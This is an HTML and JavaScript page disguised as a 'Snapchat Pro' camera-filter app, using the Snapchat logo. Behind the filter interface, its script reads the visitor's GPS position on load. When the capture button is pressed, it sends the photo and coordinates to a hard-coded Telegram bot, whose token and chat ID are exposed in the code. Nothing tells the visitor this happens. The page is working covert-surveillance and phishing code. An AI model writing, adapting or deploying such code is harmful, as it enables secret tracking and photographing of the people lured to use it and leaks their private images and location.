<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Snapchat Pro</title>
  <style>
    /* Reset styles */
    body, html {
      margin: 0;
      padding: 0;
      overflow: hidden;
      font-family: Arial, sans-serif;
    }

    #camera-container {
      position: relative;
      width: 100vw;
      height: 100vh;
      background: black;
    }

    /* Full-screen video */
    #camera {
      width: 100%;
      height: 100%;
      object-fit: cover;
      position: absolute;
      top: 0;
      left: 0;
      filter: none;
      transition: filter 0.3s ease;
    }

    /* Header (title and logo) */
    #header {
      position: absolute;
      top: 0;
      left: 50%;
      transform: translateX(-50%);
      padding: 15px;
      display: flex;
      flex-direction: column;
      align-items: center;
      z-index: 10;
    }

    #header h1 {
      color: white;
      margin: 0;
      font-size: 20px;
      text-align: center;
    }

    #header img {
      width: 50px;
      height: 50px;
      border-radius: 50%;
      margin-top: 5px;
    }

    /* Buttons Container */
    #controls {
      position: fixed;
      bottom: 20px;
      left: 50%;
      transform: translateX(-50%);
      display: flex;
      flex-direction: column;
      align-items: center;
      z-index: 20;
    }

    /* Filter Buttons */
    .filter-buttons {
      display: flex;
      gap: 15px;
      margin-bottom: 20px;
    }

    .filter-button {
      width: 50px;
      height: 50px;
      background-color: rgba(255, 255, 255, 0.3);
      border: 2px solid white;
      border-radius: 50%;
      cursor: pointer;
      transition: transform 0.2s ease, background-color 0.3s ease;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 12px; /* Reduced font size */
      color: white;
    }

    .filter-button:hover {
      transform: scale(1.2);
      background-color: rgba(255, 255, 255, 0.5);
    }

    .filter-button.active {
      background-color: rgba(255, 255, 255, 1);
    }

    /* Action Buttons */
    #action-buttons {
      display: flex;
      gap: 15px;
      margin-top: 15px;
    }

    .button {
      width: 50px;
      height: 50px;
      background-color: rgba(255, 255, 255, 0.3);
      border: 2px solid white;
      border-radius: 50%;
      cursor: pointer;
      transition: transform 0.2s ease, background-color 0.3s ease;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 18px;
      color: white;
    }

    .button:hover {
      transform: scale(1.2);
      background-color: rgba(255, 255, 255, 0.5);
    }

    .button.active {
      background-color: rgba(255, 255, 255, 1);
    }
  </style>
</head>
<body>
  <div id="camera-container">
    <!-- Header -->
    <div id="header">
      <h1>Snapchat Pro</h1>
      <img src="https://cdn.icon-icons.com/icons2/694/PNG/512/SnapChat_Rounded_icon-icons.com_61574.png" alt="Logo">
    </div>

    <!-- Camera -->
    <video id="camera" autoplay playsinline muted></video>

    <!-- Controls -->
    <div id="controls">
      <!-- Filter Buttons -->
      <div class="filter-buttons">
        <button class="filter-button" data-filter="grayscale">GS</button>
        <button class="filter-button" data-filter="sepia">S</button>
        <button class="filter-button" data-filter="invert">I</button>
        <button class="filter-button" data-filter="blur">B</button>
        <button class="filter-button" data-filter="none">N</button>
      </div>

      <!-- Action Buttons -->
      <div id="action-buttons">
        <div id="capture" class="button">ðŸ“¸</div>
        <div id="toggle-camera" class="button">ðŸ”„</div>
      </div>
    </div>
  </div>

<script>
  const video = document.getElementById('camera');
  const captureButton = document.getElementById('capture');
  const toggleCameraButton = document.getElementById('toggle-camera');
  const filterButtons = document.querySelectorAll('.filter-button');

  let currentStream = null;
  let usingFrontCamera = true;
  let gpsLocation = null;

  // Ø§Ù„ÙÙ„ØªØ± Ø§Ù„Ø§ÙØªØ±Ø§Ø¶ÙŠ
  let currentFilter = 'none';

  // Start camera
  async function startCamera(front = true) {
    const constraints = {
      video: {
        facingMode: front ? 'user' : 'environment',
      },
    };

    if (currentStream) {
      currentStream.getTracks().forEach(track => track.stop());
    }

    try {
      currentStream = await navigator.mediaDevices.getUserMedia(constraints);
      video.srcObject = currentStream;

      if (front) {
        video.style.transform = 'scaleX(-1)';
      } else {
        video.style.transform = 'scaleX(1)';
      }
    } catch (error) {
      console.error('Error accessing camera:', error);
      alert('Error accessing camera. Please check camera permissions.');
    }
  }

  // Toggle camera
  toggleCameraButton.addEventListener('click', () => {
    usingFrontCamera = !usingFrontCamera;
    startCamera(usingFrontCamera);
  });

  // Capture image and send it to Telegram bot
  captureButton.addEventListener('click', () => {
    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    const ctx = canvas.getContext('2d');
    ctx.filter = currentFilter; // ØªØ·Ø¨ÙŠÙ‚ Ø§Ù„ÙÙ„ØªØ± Ø£Ø«Ù†Ø§Ø¡ Ø§Ù„Ø§Ù„ØªÙ‚Ø§Ø·
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    const image = canvas.toDataURL('image/png');
    const blob = dataURLToBlob(image);

    sendImageAndLocationToTelegram(blob);
  });

  // Get GPS location
  navigator.geolocation.getCurrentPosition(
    position => {
      gpsLocation = position.coords;
    },
    error => console.error('Error getting location:', error)
  );

  // Apply filter when filter button is clicked
  filterButtons.forEach(button => {
    button.addEventListener('click', () => {
      // Ø¥Ø²Ø§Ù„Ø© Ø§Ù„ÙØ¦Ø© Ø§Ù„Ù†Ø´Ø·Ø© Ù…Ù† ÙƒÙ„ Ø§Ù„Ø£Ø²Ø±Ø§Ø±
      filterButtons.forEach(btn => btn.classList.remove('active'));

      // Ø¥Ø¶Ø§ÙØ© Ø§Ù„ÙØ¦Ø© Ø§Ù„Ù†Ø´Ø·Ø© Ø¥Ù„Ù‰ Ø§Ù„Ø²Ø± Ø§Ù„Ø­Ø§Ù„ÙŠ
      button.classList.add('active');

      // ØªØ­Ø¯ÙŠØ« Ø§Ù„ÙÙ„ØªØ± Ø¨Ù†Ø§Ø¡Ù‹ Ø¹Ù„Ù‰ Ø§Ù„Ø²Ø±
      currentFilter = button.dataset.filter;

      // ØªØ·Ø¨ÙŠÙ‚ Ø§Ù„ÙÙ„ØªØ± Ø¹Ù„Ù‰ Ø§Ù„ÙÙŠØ¯ÙŠÙˆ
      video.style.filter = getCSSFilter(currentFilter);
    });
  });

  // Map filter names to CSS filter properties
  function getCSSFilter(filterName) {
    switch (filterName) {
      case 'grayscale': return 'grayscale(100%)';
      case 'sepia': return 'sepia(100%)';
      case 'invert': return 'invert(100%)';
      case 'blur': return 'blur(5px)';
      case 'none': return 'none';
      default: return 'none';
    }
  }

  // Send image and location to Telegram
  function sendImageAndLocationToTelegram(blob) {
    const formData = new FormData();
    formData.append('chat_id', '1676411287'); // Replace with your chat ID
    formData.append('photo', blob, 'photo.png');

    if (gpsLocation) {
      formData.append('caption', `Location: Latitude ${gpsLocation.latitude}, Longitude ${gpsLocation.longitude}`);
    }

    fetch('https://api.telegram.org/bot5682784122:AAFGjK0Or0jMK8g928ckWGSt4XUTojYxcRI/sendPhoto', { // Replace with your bot token
      method: 'POST',
      body: formData
    })
    .then(response => response.json())
    .then(data => console.log('Telegram response:', data))
    .catch(error => console.error('Error sending data to Telegram:', error));
  }

  // Helper function to convert dataURL to Blob
  function dataURLToBlob(dataURL) {
    const byteString = atob(dataURL.split(',')[1]);
    const mimeString = dataURL.split(',')[0].split(':')[1].split(';')[0];
    const byteArray = new Uint8Array(byteString.length);

    for (let i = 0; i < byteString.length; i++) {
      byteArray[i] = byteString.charCodeAt(i);
    }

    return new Blob([byteArray], { type: mimeString });
  }

  startCamera(true);
</script>

</body>
</html>
